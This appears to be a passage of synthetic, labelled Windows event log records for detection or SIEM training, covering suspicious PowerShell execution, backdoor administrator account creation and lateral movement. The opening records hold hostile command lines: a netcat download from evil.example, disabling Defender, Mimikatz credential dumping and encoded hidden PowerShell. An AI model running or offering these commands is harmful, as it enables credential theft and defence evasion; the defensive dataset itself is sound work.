  {
    "_time": "2024-01-01T02:13:10",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "svc_backup",
    "src_ip": "185.220.101.45",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by svc_backup: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T02:14:10",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-SQL-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "mwilson",
    "src_ip": "194.165.16.78",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "command_line": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "script_block": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by mwilson: powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAc..."
  },
  {
    "_time": "2024-01-01T02:14:20",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-SQL-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "administrator",
    "src_ip": "77.91.68.33",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by administrator: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T02:14:46",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "mwilson",
    "src_ip": "192.168.1.101",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by mwilson: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
  {
    "_time": "2024-01-01T02:14:54",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-HR-02",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "mwilson",
    "src_ip": "103.97.125.220",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "script_block": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by mwilson: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=..."
  },
  {
    "_time": "2024-01-01T02:15:41",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "DC-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "bmartin",
    "src_ip": "103.97.125.220",
    "dest_host": "DC-01",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "script_block": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by bmartin: powershell.exe -nop -exec bypass -c \"Import-Module PowerSplo..."
  },
  {
    "_time": "2024-01-01T02:16:34",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-FINANCE-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "njones",
    "src_ip": "91.108.4.12",
    "dest_host": "WS-FINANCE-01",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by njones: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T02:17:22",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-SQL-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "admin",
    "src_ip": "185.220.101.45",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "script_block": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by admin: powershell.exe -nop -exec bypass -c \"Import-Module PowerSplo..."
  },
  {
    "_time": "2024-01-01T02:17:52",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-FINANCE-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "pclark",
    "src_ip": "103.97.125.220",
    "dest_host": "WS-FINANCE-01",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "script_block": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by pclark: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=..."
  },
  {
    "_time": "2024-01-01T02:18:46",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "mwilson",
    "src_ip": "185.56.80.65",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by mwilson: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
  {
    "_time": "2024-01-01T02:18:51",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "clee",
    "src_ip": "194.165.16.78",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "script_block": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by clee: powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAc..."
  },
  {
    "_time": "2024-01-01T02:19:30",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-HR-02",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "administrator",
    "src_ip": "77.91.68.33",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by administrator: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T02:20:02",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "DC-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "jsmith",
    "src_ip": "10.0.1.12",
    "dest_host": "DC-01",
    "domain": "CORP",
    "command_line": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1",
    "script_block": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by jsmith: powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1..."
  },
  {
    "_time": "2024-01-01T02:37:02",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4720,
    "event_type": "account_created",
    "attack_category": "new_admin_account",
    "user": "svc_backup",
    "new_account": "backdoor_admin",
    "src_ip": "10.0.2.34",
    "dest_host": "DC-01",
    "domain": "CORP",
    "message": "A user account was created. New Account: backdoor_admin. Created by: svc_backup"
  },
  {
    "_time": "2024-01-01T02:37:17",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4732,
    "event_type": "group_add",
    "attack_category": "new_admin_account",
    "user": "svc_backup",
    "new_account": "backdoor_admin",
    "src_ip": "77.91.68.33",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_group": "Administrators",
    "message": "backdoor_admin was added to Administrators group by svc_backup"
  },
  {
    "_time": "2024-01-01T02:51:17",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4720,
    "event_type": "account_created",
    "attack_category": "new_admin_account",
    "user": "jsmith",
    "new_account": "helpdsk99",
    "src_ip": "77.91.68.33",
    "dest_host": "DC-01",
    "domain": "CORP",
    "message": "A user account was created. New Account: helpdsk99. Created by: jsmith"
  },
  {
    "_time": "2024-01-01T02:51:32",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4732,
    "event_type": "group_add",
    "attack_category": "new_admin_account",
    "user": "jsmith",
    "new_account": "helpdsk99",
    "src_ip": "185.220.101.45",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_group": "Administrators",
    "message": "helpdsk99 was added to Administrators group by jsmith"
  },
  {
    "_time": "2024-01-01T03:06:32",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4720,
    "event_type": "account_created",
    "attack_category": "new_admin_account",
    "user": "jsmith",
    "new_account": "temp_admin",
    "src_ip": "192.168.1.101",
    "dest_host": "DC-01",
    "domain": "CORP",
    "message": "A user account was created. New Account: temp_admin. Created by: jsmith"
  },
  {
    "_time": "2024-01-01T03:06:47",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4732,
    "event_type": "group_add",
    "attack_category": "new_admin_account",
    "user": "jsmith",
    "new_account": "temp_admin",
    "src_ip": "10.0.1.12",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_group": "Administrators",
    "message": "temp_admin was added to Administrators group by jsmith"
  },
  {
    "_time": "2024-01-01T03:25:47",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4720,
    "event_type": "account_created",
    "attack_category": "new_admin_account",
    "user": "svc_backup",
    "new_account": "svc_hidden",
    "src_ip": "185.56.80.65",
    "dest_host": "DC-01",
    "domain": "CORP",
    "message": "A user account was created. New Account: svc_hidden. Created by: svc_backup"
  },
  {
    "_time": "2024-01-01T03:26:02",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4732,
    "event_type": "group_add",
    "attack_category": "new_admin_account",
    "user": "svc_backup",
    "new_account": "svc_hidden",
    "src_ip": "91.108.4.12",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_group": "Administrators",
    "message": "svc_hidden was added to Administrators group by svc_backup"
  },
  {
    "_time": "2024-01-01T03:27:17",
    "source": "WinEventLog:Security",
    "host": "WS-FINANCE-01",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "svc_sql",
    "src_ip": "192.168.1.101",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: svc_sql logged onto WS-IT-05 from WS-FINANCE-01"
  },
  {
    "_time": "2024-01-01T03:28:44",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "adavis",
    "src_ip": "10.0.1.12",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: adavis logged onto WS-IT-05 from DC-01"
  },
  {
    "_time": "2024-01-01T03:30:43",
    "source": "WinEventLog:Security",
    "host": "WS-FINANCE-01",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "mwilson",
    "src_ip": "192.168.1.101",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: mwilson logged onto SRV-WEB-01 from WS-FINANCE-01"
  },
  {
    "_time": "2024-01-01T03:32:42",
    "source": "WinEventLog:Security",
    "host": "WS-IT-05",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "lwhite",
    "src_ip": "10.0.1.12",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: lwhite logged onto LAPTOP-EXEC-03 from WS-IT-05"
  },
  {
    "_time": "2024-01-01T03:33:20",
    "source": "WinEventLog:Security",
    "host": "WS-HR-02",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "kthomas",
    "src_ip": "10.0.0.5",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: kthomas logged onto WS-IT-05 from WS-HR-02"
  },
  {
    "_time": "2024-01-01T03:35:18",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "admin",
    "src_ip": "192.168.1.101",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: admin logged onto SRV-SQL-01 from DC-01"
  },
  {
    "_time": "2024-01-01T03:36:58",
    "source": "WinEventLog:Security",
    "host": "WS-HR-02",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "lwhite",
    "src_ip": "192.168.1.50",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: lwhite logged onto SRV-SQL-01 from WS-HR-02"
  },
  {
    "_time": "2024-01-01T03:38:38",
    "source": "WinEventLog:Security",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "kthomas",
    "src_ip": "10.0.2.34",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: kthomas logged onto WS-IT-05 from LAPTOP-EXEC-03"
  },
  {
    "_time": "2024-01-01T03:39:37",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "clee",
    "src_ip": "10.0.2.34",
    "dest_host": "WS-FINANCE-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: clee logged onto WS-FINANCE-01 from DC-01"
  },
  {
    "_time": "2024-01-01T03:40:06",
    "source": "WinEventLog:Security",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "admin",
    "src_ip": "192.168.1.50",
    "dest_host": "WS-FINANCE-01",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: admin logged onto WS-FINANCE-01 from LAPTOP-EXEC-03"
  },
  {
    "_time": "2024-01-01T03:41:23",
    "source": "WinEventLog:Security",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "helpdesk",
    "src_ip": "10.0.2.34",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: helpdesk logged onto SRV-SQL-01 from LAPTOP-EXEC-03"
  },
  {
    "_time": "2024-01-01T03:42:47",
    "source": "WinEventLog:Security",
    "host": "WS-FINANCE-01",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "mwilson",
    "src_ip": "10.0.2.34",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: mwilson logged onto SRV-SQL-01 from WS-FINANCE-01"
  },
  {
    "_time": "2024-01-01T03:44:11",
    "source": "WinEventLog:Security",
    "host": "WS-HR-02",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "admin",
    "src_ip": "192.168.1.50",
    "dest_host": "WS-FINANCE-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: admin logged onto WS-FINANCE-01 from WS-HR-02"
  },
  {
    "_time": "2024-01-01T03:45:38",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "njones",
    "src_ip": "10.0.2.34",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: njones logged onto WS-HR-02 from SRV-SQL-01"
  },
  {
    "_time": "2024-01-01T03:46:47",
    "source": "WinEventLog:Security",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "bmartin",
    "src_ip": "10.0.2.34",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: bmartin logged onto WS-IT-05 from LAPTOP-EXEC-03"
  },
  {
    "_time": "2024-01-01T03:47:49",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "adavis",
    "src_ip": "10.0.2.34",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: adavis logged onto LAPTOP-EXEC-03 from SRV-SQL-01"
  },
  {
    "_time": "2024-01-01T03:49:41",
    "source": "WinEventLog:Security",
    "host": "SRV-WEB-01",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "svc_sql",
    "src_ip": "10.0.2.34",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: svc_sql logged onto SRV-SQL-01 from SRV-WEB-01"
  },
  {
    "_time": "2024-01-01T03:51:15",
    "source": "WinEventLog:Security",
    "host": "WS-HR-02",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "admin",
    "src_ip": "192.168.1.50",
    "dest_host": "DC-01",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: admin logged onto DC-01 from WS-HR-02"
  },
  {
    "_time": "2024-01-01T03:52:51",
    "source": "WinEventLog:Security",
    "host": "WS-FINANCE-01",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "administrator",
    "src_ip": "10.0.2.34",
    "dest_host": "DC-01",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: administrator logged onto DC-01 from WS-FINANCE-01"
  },
  {
    "_time": "2024-01-01T03:54:36",
    "source": "WinEventLog:Security",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "administrator",
    "src_ip": "192.168.1.50",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: administrator logged onto SRV-WEB-01 from LAPTOP-EXEC-03"
  },
  {
    "_time": "2024-01-01T03:54:58",
    "source": "WinEventLog:Security",
    "host": "WS-IT-05",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "lwhite",
    "src_ip": "10.0.2.34",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: lwhite logged onto WS-HR-02 from WS-IT-05"
  },
  {
    "_time": "2024-01-01T03:55:42",
    "source": "WinEventLog:Security",
    "host": "WS-HR-02",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "rjohnson",
    "src_ip": "10.0.2.34",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: rjohnson logged onto WS-IT-05 from WS-HR-02"
  },
  {
    "_time": "2024-01-01T03:57:06",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "svc_backup",
    "src_ip": "10.0.2.34",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: svc_backup logged onto LAPTOP-EXEC-03 from SRV-SQL-01"
  },
  {
    "_time": "2024-01-01T03:58:42",
    "source": "WinEventLog:Security",
    "host": "WS-HR-02",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "bmartin",
    "src_ip": "192.168.1.101",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: bmartin logged onto WS-IT-05 from WS-HR-02"
  },
  {
    "_time": "2024-01-01T04:00:34",
    "source": "WinEventLog:Security",
    "host": "WS-FINANCE-01",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "clee",
    "src_ip": "10.0.1.12",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: clee logged onto SRV-SQL-01 from WS-FINANCE-01"
  },
  {
    "_time": "2024-01-01T04:02:12",
    "source": "WinEventLog:Security",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "kthomas",
    "src_ip": "10.0.1.12",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: kthomas logged onto SRV-WEB-01 from LAPTOP-EXEC-03"
  },
  {
    "_time": "2024-01-01T04:03:11",
    "source": "WinEventLog:Security",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "svc_backup",
    "src_ip": "10.0.2.34",
    "dest_host": "DC-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: svc_backup logged onto DC-01 from LAPTOP-EXEC-03"
  },
  {
    "_time": "2024-01-01T04:04:30",
    "source": "WinEventLog:Security",
    "host": "WS-IT-05",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "svc_backup",
    "src_ip": "10.0.1.12",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: svc_backup logged onto SRV-SQL-01 from WS-IT-05"
  },
  {
    "_time": "2024-01-01T04:06:07",
    "source": "WinEventLog:Security",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "mwilson",
    "src_ip": "192.168.1.50",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: mwilson logged onto WS-IT-05 from LAPTOP-EXEC-03"
  },
  {
    "_time": "2024-01-01T04:07:37",
    "source": "WinEventLog:Security",
    "host": "WS-FINANCE-01",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "helpdesk",
    "src_ip": "10.0.2.34",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: helpdesk logged onto LAPTOP-EXEC-03 from WS-FINANCE-01"
  },
  {
    "_time": "2024-01-01T04:09:34",
    "source": "WinEventLog:Security",
    "host": "WS-IT-05",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "mwilson",
    "src_ip": "192.168.1.50",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: mwilson logged onto SRV-SQL-01 from WS-IT-05"
  },
  {
    "_time": "2024-01-01T04:10:22",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "svc_sql",
    "src_ip": "192.168.1.50",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: svc_sql logged onto WS-IT-05 from DC-01"
  },
  {
    "_time": "2024-01-01T04:11:32",
    "source": "WinEventLog:Security",
    "host": "WS-IT-05",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "njones",
    "src_ip": "10.0.0.5",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: njones logged onto WS-HR-02 from WS-IT-05"
  },
  {
    "_time": "2024-01-01T04:12:20",
    "source": "WinEventLog:Security",
    "host": "WS-IT-05",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "jsmith",
    "src_ip": "10.0.1.12",
    "dest_host": "WS-FINANCE-01",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: jsmith logged onto WS-FINANCE-01 from WS-IT-05"
  },
  {
    "_time": "2024-01-01T04:12:44",
    "source": "WinEventLog:Security",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "kthomas",
    "src_ip": "192.168.1.50",
    "dest_host": "DC-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: kthomas logged onto DC-01 from LAPTOP-EXEC-03"
  },
  {
    "_time": "2024-01-01T04:14:22",
    "source": "WinEventLog:Security",
    "host": "WS-FINANCE-01",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "jsmith",
    "src_ip": "10.0.1.12",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: jsmith logged onto WS-HR-02 from WS-FINANCE-01"
  },
  {
    "_time": "2024-01-01T04:15:52",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "administrator",
    "src_ip": "10.0.0.5",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: administrator logged onto SRV-WEB-01 from SRV-SQL-01"
  },
  {
    "_time": "2024-01-01T04:16:42",
    "source": "WinEventLog:Security",
    "host": "WS-FINANCE-01",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "kthomas",
    "src_ip": "192.168.1.50",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: kthomas logged onto WS-HR-02 from WS-FINANCE-01"
  },
  {
    "_time": "2024-01-01T04:17:10",
    "source": "WinEventLog:Security",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "adavis",
    "src_ip": "192.168.1.101",
    "dest_host": "DC-01",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: adavis logged onto DC-01 from LAPTOP-EXEC-03"
  },
  {
    "_time": "2024-01-01T04:19:01",
    "source": "WinEventLog:Security",
    "host": "WS-IT-05",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "mwilson",
    "src_ip": "192.168.1.101",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: mwilson logged onto SRV-SQL-01 from WS-IT-05"
  },
  {
    "_time": "2024-01-01T04:19:51",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "pclark",
    "src_ip": "192.168.1.101",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: pclark logged onto WS-HR-02 from DC-01"
  },
  {
    "_time": "2024-01-01T04:20:19",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "njones",
    "src_ip": "192.168.1.50",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: njones logged onto SRV-WEB-01 from SRV-SQL-01"
  },
  {
